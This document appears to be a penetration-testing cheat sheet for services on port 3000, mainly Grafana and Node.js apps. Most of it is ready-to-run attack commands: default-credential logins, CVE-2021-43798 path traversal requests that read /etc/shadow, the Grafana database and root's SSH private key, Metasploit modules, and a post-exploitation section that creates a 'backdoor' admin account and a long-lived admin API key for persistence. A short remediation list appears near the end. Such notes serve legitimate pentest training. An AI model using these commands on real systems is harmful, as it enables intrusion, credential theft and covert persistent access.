# NODE.JS / GRAFANA ENUMERATION (Port 3000)

## SERVICE OVERVIEW
```
Port 3000 is commonly used for:
- Node.js/Express development servers
- React development servers
- Grafana monitoring dashboards
- Rails development servers
- Create React App default port
- Development/testing environments
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p3000 <IP>                             # Service/Version detection
curl -I http://<IP>:3000                         # HTTP headers
curl http://<IP>:3000 | grep -i "grafana\|node\|react\|express"
nc -nv <IP> 3000                                 # Manual connection
```

## SERVICE DETECTION
```bash
# Detect what's running
whatweb http://<IP>:3000 -a 3                    # Aggressive fingerprinting
curl -I http://<IP>:3000 | grep -i "server\|x-powered"

# Common applications on port 3000:
# - Grafana (monitoring/dashboards)
# - Node.js/Express apps
# - React development server
# - Ruby on Rails (development)
# - Meteor applications
```

## GRAFANA DETECTION & EXPLOITATION
```bash
# Detect Grafana
curl http://<IP>:3000/login | grep -i grafana
curl -I http://<IP>:3000 | grep -i grafana
curl http://<IP>:3000/api/health                 # Health check

# Grafana login page
curl http://<IP>:3000/login

# Version detection
curl http://<IP>:3000/api/frontend/settings | grep -i version
curl http://<IP>:3000/public/build/grafana.css | head -n 5  # Version in CSS
```

## GRAFANA DEFAULT CREDENTIALS
```bash
# Default Grafana credentials
admin:admin
admin:password
grafana:grafana

# Test login
curl -X POST http://<IP>:3000/login \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","password":"admin"}'

# Or via cookie
curl -c cookies.txt -X POST http://<IP>:3000/login \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","password":"admin"}'
```

## GRAFANA VULNERABILITIES
```bash
# Search for Grafana exploits
searchsploit grafana

# Critical Grafana CVEs:
# CVE-2021-43798: Directory traversal (arbitrary file read)
# CVE-2021-39226: Snapshot authentication bypass
# CVE-2020-13379: SSRF via avatar feature
# CVE-2020-13430: SQL injection
# CVE-2019-15043: API key privilege escalation

# Nmap vuln scan
nmap -p3000 --script vuln <IP>
```

## CVE-2021-43798 (GRAFANA PATH TRAVERSAL)
```bash
# Critical vulnerability: Arbitrary file read
# Affects Grafana 8.0.0-beta1 through 8.3.0

# Test for vulnerability
curl "http://<IP>:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"

# If vulnerable, read files:
curl "http://<IP>:3000/public/plugins/alertlist/../../../../../../../etc/passwd"
curl "http://<IP>:3000/public/plugins/alertGroups/../../../../../../../etc/shadow"
curl "http://<IP>:3000/public/plugins/alertlist/../../../../../../../etc/grafana/grafana.ini"

# Read Grafana config
curl "http://<IP>:3000/public/plugins/alertlist/../../../../../../../etc/grafana/grafana.ini"

# Read database credentials
curl "http://<IP>:3000/public/plugins/alertlist/../../../../../../../var/lib/grafana/grafana.db"

# Windows
curl "http://<IP>:3000/public/plugins/alertlist/../../../../../../../windows/win.ini"

# Metasploit
use auxiliary/scanner/http/grafana_traversal      # CVE-2021-43798
set RHOSTS <IP>
set RPORT 3000
set FILEPATH /etc/passwd
run
```

## GRAFANA API ENUMERATION
```bash
# Common Grafana API endpoints
curl http://<IP>:3000/api/health                 # Health check
curl http://<IP>:3000/api/frontend/settings      # Settings (version info)
curl http://<IP>:3000/api/datasources            # Datasources (requires auth)
curl http://<IP>:3000/api/dashboards/home        # Home dashboard
curl http://<IP>:3000/api/search                 # Search dashboards
curl http://<IP>:3000/api/org                    # Organization info
curl http://<IP>:3000/api/admin/stats            # Admin stats

# With authentication
curl -H "Authorization: Bearer <API_KEY>" http://<IP>:3000/api/datasources
```

## GRAFANA AUTHENTICATED ENUMERATION
```bash
# After successful login

# Get API key
curl -X POST -H "Content-Type: application/json" \
  -d '{"name":"test","role":"Admin"}' \
  -b cookies.txt http://<IP>:3000/api/auth/keys

# List users
curl -b cookies.txt http://<IP>:3000/api/users

# List datasources (may contain DB credentials!)
curl -b cookies.txt http://<IP>:3000/api/datasources

# List dashboards
curl -b cookies.txt http://<IP>:3000/api/search

# Get organization info
curl -b cookies.txt http://<IP>:3000/api/org
```

## NODE.JS / EXPRESS DETECTION
```bash
# Detect Node.js/Express
curl -I http://<IP>:3000 | grep -i "express\|node"
curl http://<IP>:3000 | grep -i "express\|node"

# Common Node.js paths
curl http://<IP>:3000/
curl http://<IP>:3000/api
curl http://<IP>:3000/admin
curl http://<IP>:3000/debug
curl http://<IP>:3000/graphql
curl http://<IP>:3000/package.json               # Package info

# Check for debug mode
curl http://<IP>:3000/debug
curl http://<IP>:3000/_debug
```

## DIRECTORY ENUMERATION
```bash
# Directory brute forcing
gobuster dir -u http://<IP>:3000 -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://<IP>:3000/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Common paths
/api
/admin
/login
/dashboard
/debug
/graphql
/swagger
/docs
/metrics
/health
```

## REACT/WEBPACK DETECTION
```bash
# React development server detection
curl http://<IP>:3000 | grep -i "react\|webpack"

# Check for webpack dev server
curl http://<IP>:3000/webpack-dev-server

# React app typical structure
curl http://<IP>:3000/static/js/main.js          # Main bundle
curl http://<IP>:3000/manifest.json              # Manifest
curl http://<IP>:3000/asset-manifest.json        # Asset manifest
```

## GRAPHQL ENUMERATION
```bash
# Test for GraphQL endpoint
curl -X POST http://<IP>:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# GraphQL introspection
curl -X POST http://<IP>:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name description } } } }"}'

# GraphiQL interface (if enabled)
curl http://<IP>:3000/graphql
curl http://<IP>:3000/graphiql
```

## COMMON MISCONFIGURATIONS
```
☐ Development server in production               # Debug features enabled
☐ Default Grafana credentials (admin:admin)      # Easy access
☐ No authentication required                     # Open access
☐ Debug mode enabled                             # Stack traces, info leakage
☐ Source maps exposed                            # Source code disclosure
☐ Directory listing enabled                      # Information disclosure
☐ CORS misconfiguration                          # XSS/CSRF attacks
☐ Exposed to internet (should be internal)       # Easy target
```

## VULNERABILITY SCANNING
```bash
# Nikto scan
nikto -h http://<IP>:3000

# Nmap scripts
nmap -p3000 --script http-enum <IP>
nmap -p3000 --script http-vuln-* <IP>

# Search for vulnerabilities
searchsploit node.js
searchsploit express
searchsploit grafana
searchsploit react
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/http/grafana_traversal     # CVE-2021-43798
use auxiliary/scanner/http/grafana_login         # Login scanner (if exists)
use auxiliary/scanner/http/dir_scanner           # Directory scanner
set RHOSTS <IP>
set RPORT 3000
run
```

## SENSITIVE FILE EXTRACTION
```bash
# If Grafana CVE-2021-43798 is vulnerable

# Configuration files
curl "http://<IP>:3000/public/plugins/alertlist/../../../../../../../etc/grafana/grafana.ini"
curl "http://<IP>:3000/public/plugins/alertlist/../../../../../../../etc/grafana/ldap.toml"

# Database
curl "http://<IP>:3000/public/plugins/alertlist/../../../../../../../var/lib/grafana/grafana.db" -o grafana.db

# System files
curl "http://<IP>:3000/public/plugins/alertlist/../../../../../../../etc/passwd"
curl "http://<IP>:3000/public/plugins/alertlist/../../../../../../../etc/shadow"
curl "http://<IP>:3000/public/plugins/alertlist/../../../../../../../root/.ssh/id_rsa"
```

## QUICK WIN CHECKLIST
```
☐ Test Grafana default credentials (admin:admin)
☐ Test CVE-2021-43798 (path traversal)
☐ Check if authentication required
☐ Enumerate API endpoints
☐ Look for exposed package.json
☐ Test for GraphQL introspection
☐ Check for debug mode
☐ Look for source maps
☐ Test for CORS misconfiguration
☐ Search for version-specific exploits
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive scan
nmap -sV -p3000 --script "http-*" -oA port_3000_enum <IP>

# Quick Grafana check
curl -s http://<IP>:3000/login | grep -i grafana

# Test CVE-2021-43798
curl -s "http://<IP>:3000/public/plugins/alertlist/../../../../../../../etc/passwd"
```

## POST-EXPLOITATION
```bash
# After Grafana access

# 1. Extract database credentials from datasources
curl -b cookies.txt http://<IP>:3000/api/datasources
# Look for MySQL, PostgreSQL, MSSQL credentials

# 2. Read grafana.db for stored credentials
# Download via CVE-2021-43798 or authenticated access
sqlite3 grafana.db ".tables"
sqlite3 grafana.db "SELECT * FROM user;"
sqlite3 grafana.db "SELECT * FROM data_source;"

# 3. Create admin user
curl -X POST -b cookies.txt http://<IP>:3000/api/admin/users \
  -H "Content-Type: application/json" \
  -d '{"name":"backdoor","login":"backdoor","password":"password123","role":"Admin"}'

# 4. Extract all dashboards
curl -b cookies.txt http://<IP>:3000/api/search > dashboards.json

# 5. Persistence via API key
curl -X POST -b cookies.txt http://<IP>:3000/api/auth/keys \
  -H "Content-Type: application/json" \
  -d '{"name":"backdoor","role":"Admin","secondsToLive":31536000}'
```

## GRAFANA CONFIGURATION FILES
```bash
# Important Grafana files
/etc/grafana/grafana.ini                         # Main config
/etc/grafana/ldap.toml                           # LDAP config
/var/lib/grafana/grafana.db                      # SQLite database
/var/log/grafana/grafana.log                     # Log file
/usr/share/grafana/                              # Installation directory
```

## SECURITY IMPLICATIONS
```
CRITICAL RISKS:
1. Default credentials (admin:admin)
2. CVE-2021-43798 = arbitrary file read
3. Contains database credentials (datasources)
4. May have access to monitored systems
5. Can reveal infrastructure topology
6. SSRF vulnerabilities
7. Often exposed to internet
8. Development servers in production

RECOMMENDATION:
- Change default credentials immediately
- Update to latest Grafana version
- Restrict access to internal network/VPN
- Don't expose development servers
- Use strong authentication
- Enable HTTPS
- Regular security audits
- Monitor for suspicious activity
```

## PORT 3000 IDENTIFICATION FLOWCHART
```
Access http://<IP>:3000 →

1. Check /login for Grafana branding
   → Grafana: Test admin:admin, CVE-2021-43798

2. Check response headers for "Express" or "Node"
   → Node.js: Look for /api, /graphql, package.json

3. Check for "React" in page source
   → React Dev Server: Check webpack-dev-server, source maps

4. Check for "Rails" or "Ruby"
   → Rails: Look for /rails/info, development mode

5. Check for error messages/stack traces
   → Development server: Look for debug endpoints, config files
```
